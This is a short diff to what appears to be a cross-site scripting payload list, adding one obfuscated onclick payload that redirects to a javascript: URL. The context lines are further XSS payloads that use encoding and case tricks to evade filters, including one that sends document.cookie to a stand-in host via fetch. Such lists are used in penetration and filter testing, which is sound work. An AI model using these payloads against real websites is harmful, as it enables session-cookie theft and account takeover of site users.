@@ -9,6 +9,7 @@
 pccwmoov://appshare%3Fpageid%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(document.cookie)%3C/ScRiPt%3E
 '<00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/
 "<!--><Svg+OnLoad%3dconfirm%3f.(%2fcypher😈%2f)<!--1")
+" onclick​=l&#92;u{6F}cati&#92;u{6F}n.href="javascript​:alert(1)">
 #"></div><a href=javascript​&colon;fetch&lpar;'//site&period;com/'&plus;document&period;cookie&rpar;
 java%0D%0Ascript%0D%0A:alert(document.domain)
 ';k='e'%0Atop['al'+k+'rt'](1)//
